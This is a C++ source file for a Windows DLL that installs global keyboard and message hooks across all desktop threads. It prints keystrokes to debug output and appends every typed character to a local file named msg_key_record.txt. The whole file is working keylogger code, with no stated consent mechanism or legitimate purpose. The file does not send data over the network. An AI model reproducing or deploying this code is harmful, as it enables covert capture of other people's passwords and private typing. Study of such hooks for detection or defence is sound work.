// keyHook.cpp : Defines the exported functions for the DLL application.
//

#include "stdafx.h"
#include "keyHook.h"

#include <stdio.h> 
#include <process.h> 
#include <string>
//#include <Shlwapi.h>
//
//#pragma comment(lib, "shell32.lib")

static BOOL bHooked = FALSE;
static HHOOK hhook = 0;
static HHOOK hhookMsg = 0;

extern HINSTANCE hInst;

std::string GetProgramRunDir(HMODULE hDllModule);

LRESULT CALLBACK KeyboardProc(int code, 
	WPARAM wParam, 
	LPARAM lParam
	);
LRESULT CALLBACK GetMsgProc(
	int nCode, // hook code
	WPARAM wParam, // virtual-key code
	LPARAM lParam // keystroke-message information
	);

KEYHOOK_API void SetKbHook(void)
{
	if (!bHooked)
	{
		hhook = SetWindowsHookEx(WH_KEYBOARD, (HOOKPROC)KeyboardProc, hInst, (DWORD)NULL);
		//hhookCBT = SetWindowsHookEx(WH_CBT, (HOOKPROC)CBTProc, hInst, (DWORD)NULL);
		hhookMsg = SetWindowsHookEx(WH_GETMESSAGE, GetMsgProc, hInst, (DWORD)NULL);
		bHooked = TRUE;
		DebugOutputMsg(_T("SetKbHook, bHooked = %d."), bHooked);
	}
}

KEYHOOK_API void RemoveKbHook(void)
{
	if (bHooked) {
		DebugOutputMsg(_T("unload key board hook."));
		UnhookWindowsHookEx(hhook);
	}
}

static int flag_capital =0;
LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam)
{
	LRESULT hr = CallNextHookEx(hhook, code, wParam, lParam);
	int flag_shift;
	
	if (code == HC_ACTION && lParam & 0x80000000)  //WM_KEYUP?
	{
		if ((wParam == VK_SHIFT)) {
			flag_shift = 0x8000 & GetKeyState(VK_SHIFT);
			DebugOutputMsg(_T("KeyboardProc, shift-key = %d "), flag_shift);
		} 
		if (wParam == VK_CAPITAL) {
			flag_capital = 0x0001 & GetKeyState(VK_CAPITAL);
			DebugOutputMsg(_T("KeyboardProc, capital-key = %d "), flag_capital);
		}
		if (wParam != VK_TAB && wParam != VK_ESCAPE && wParam != VK_LEFT && wParam != VK_RIGHT &&
			wParam != VK_UP && wParam != VK_DOWN && wParam != VK_END && wParam != VK_HOME &&
			wParam != VK_PRIOR && wParam != VK_NEXT && wParam != VK_INSERT && wParam != VK_NUMLOCK &&
			wParam != VK_SCROLL && wParam != VK_PAUSE && wParam != VK_LWIN && wParam != VK_RWIN &&
			wParam != VK_F1 && wParam != VK_F2 && wParam != VK_F3 && wParam != VK_F4 && wParam != VK_F5 &&
			wParam != VK_F6 && wParam != VK_F7 && wParam != VK_F8 && wParam != VK_F9 &&wParam != VK_F10 &&
			wParam != VK_F11 && wParam != VK_F12 && wParam != VK_CONTROL && wParam != VK_MENU && wParam != VK_SHIFT && wParam != VK_CAPITAL) {
			
			if (wParam >= 0x41 && wParam <= 0x5A)
			{
				DebugOutputMsg(_T("KeyboardProc1, wParam = %c."), flag_capital ==0 ? (wParam) : (wParam+32));
			}
			else if (wParam >= 0x61 && wParam <= 0x7A)
			{
				DebugOutputMsg(_T("KeyboardProc2, wParam = %c."), flag_capital == 0 ? (wParam) : (wParam - 32));
			}
			else {
				DebugOutputMsg(_T("KeyboardProc3, wParam = %c."),  (wParam));
			}
		}
	}
	return hr;
}

LRESULT CALLBACK GetMsgProc(
	int nCode, // hook code
	WPARAM wParam, // virtual-key code
	LPARAM lParam // keystroke-message information
	)
{
	HRESULT hr = CallNextHookEx(hhookMsg, nCode, wParam, lParam);
	if (nCode == HC_ACTION)
	{
		MSG * pMsg = (MSG *)lParam;
		if (pMsg->message == WM_CHAR)
		{
			char ch = (char)pMsg->wParam;
			char pCh[2] = { 0 };
			pCh[0] = ch;
			pCh[1] = '\0';

			DebugOutputMsg(_T("message hook, msg=%s"), pCh);

			std::string curDir = GetProgramRunDir(hInst);
			std::string msgFile = curDir + "msg_key_record.txt";
			/*if (PathFileExists(msgFile.c_str())) {

			}*/
			FILE * pFile = fopen(msgFile.c_str(), "a+");
			DWORD dwError = GetLastError();
			if (dwError != 0) {
				DebugOutputMsg(_T("savefile=%s,fopen error: %d"), msgFile.c_str(), dwError);
			}
			
			if (pFile)
			{
				fwrite(pCh, 1, strlen(pCh), pFile);
				fclose(pFile);
			}
			else
			{
				DebugOutputMsg(_T("pFile is null"));
			}
		}
	}
	return hr;
}

std::string GetProgramRunDir(HMODULE hDllModule)
{
	TCHAR exeFullPath[MAX_PATH];
	std::string strPath = _T("");

	GetModuleFileName(hDllModule, exeFullPath, MAX_PATH);
	strPath = (std::string)exeFullPath;
	int pos = strPath.find_last_of('\\', strPath.length());
	return strPath.substr(0, pos + 1);
}
